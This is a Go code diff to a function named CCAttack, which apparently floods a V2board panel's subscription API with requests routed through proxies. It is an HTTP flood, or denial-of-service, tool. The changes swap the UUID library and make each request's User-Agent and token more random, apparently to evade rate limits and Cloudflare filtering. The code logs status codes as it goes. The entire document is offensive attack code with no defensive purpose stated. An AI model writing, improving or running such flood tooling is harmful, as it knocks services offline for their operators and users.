@@ -5,7 +5,8 @@ import (
 	"crypto/tls"
 	"encoding/json"
 	"fmt"
-	"github.com/gofrs/uuid"
+	"github.com/google/uuid"
+	"math/rand"
 	"net"
 	"net/http"
 	"net/url"
@@ -60,8 +61,7 @@ func CCAttack(p *Nodes, counts *int, status *int) (aliveProxies Nodes, err error
 	}
 	baseURL.Path = "api/v1/client/subscribe"
 	params := url.Values{}
-	u4, _ := uuid.NewV4()
-	params.Add("token", strings.ReplaceAll(u4.String(), "-", ""))
+	params.Add("token", strings.ReplaceAll(uuid.New().String(), "-", ""))
 	baseURL.RawQuery = params.Encode()
 
 	addr, err := urlToMetadata(baseURL.String())
@@ -84,7 +84,10 @@ func CCAttack(p *Nodes, counts *int, status *int) (aliveProxies Nodes, err error
 
 	resp, err := resty.New().
 		SetTransport(transport).SetTLSClientConfig(&tls.Config{ServerName: config.Cfg.V2boardDomain}).
-		R().SetHeaders(map[string]string{"User-Agent": randUA(), "Host": config.Cfg.V2boardDomain}).
+		R().SetHeaders(map[string]string{
+		"User-Agent": fmt.Sprintf("%s/%s", randUA(), strings.Split(uuid.New().String(), "-")[rand.Intn(5)]),
+		"Host":       config.Cfg.V2boardDomain,
+	}).
 		SetContext(ctx).Get(baseURL.String())
 	*counts++
 	*status = resp.StatusCode()
@@ -97,13 +100,14 @@ func CCAttack(p *Nodes, counts *int, status *int) (aliveProxies Nodes, err error
 		aliveProxies = *p
 		fmt.Printf("[%d] %d\n", *counts, resp.StatusCode())
 		return
-	case !strings.Contains(string(resp.Body()), "cloudflare") && err == nil:
+	case !strings.Contains(resp.String(), "cloudflare") && err == nil:
 		aliveProxies = *p
-		if v, ok := buf["data"]; ok {
+		switch {
+		case buf["data"] != nil:
 			fmt.Printf("[%d] %d\n", *counts, resp.StatusCode())
-		} else if v, ok = buf["message"]; ok {
-			fmt.Printf("[%d] %d %s\n", *counts, resp.StatusCode(), v)
-		} else {
+		case buf["message"] != nil:
+			fmt.Printf("[%d] %d %s [%s]\n", *counts, resp.StatusCode(), buf["message"], resp.Request.Header.Get("User-Agent"))
+		default:
 			fmt.Printf("[%d] %d\n", *counts, resp.StatusCode())
 		}
 		return
